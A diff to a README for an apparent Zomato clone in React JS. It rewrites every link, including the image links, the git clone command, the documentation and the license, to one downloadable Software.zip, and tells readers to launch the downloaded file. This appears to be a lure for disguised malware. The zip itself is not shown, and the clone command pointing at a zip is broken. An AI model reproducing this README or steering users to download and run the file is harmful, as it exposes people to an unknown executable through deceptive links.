@@ -2,7 +2,7 @@
 
 ### Welcome to the Zomato Clone Using React JS repository!
 
-![Zomato Clone](https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0)
+![Zomato Clone](https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -37,7 +37,7 @@ To get started with the Zomato Clone Using React JS, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0
+   git clone https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip
    ```
 
 2. Install the dependencies:
@@ -53,13 +53,13 @@ To get started with the Zomato Clone Using React JS, follow these steps:
 ---
 
 ## Usage
-1. Visit our [product page](https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0) to download the latest release of the Zomato Clone Using React JS.
+1. Visit our [product page](https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip) to download the latest release of the Zomato Clone Using React JS.
 
 2. Launch the downloaded file to explore the features and functionalities of the application.
 
-3. For more detailed instructions on how to customize and deploy the Zomato clone, check out the [Documentation](https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0).
+3. For more detailed instructions on how to customize and deploy the Zomato clone, check out the [Documentation](https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip).
 
-![Product Page](https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0)
+![Product Page](https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -73,12 +73,12 @@ We welcome contributions from the community to enhance the Zomato Clone Using Re
 5. Push to the branch (`git push origin feature-enhancement`).
 6. Create a new Pull Request.
 
-![Contribute](https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0)
+![Contribute](https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip)
 
 ---
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/pikanija19/zomato-clone-using-react-js/releases/tag/v1.0) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/pikanija19/zomato-clone-using-react-js/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
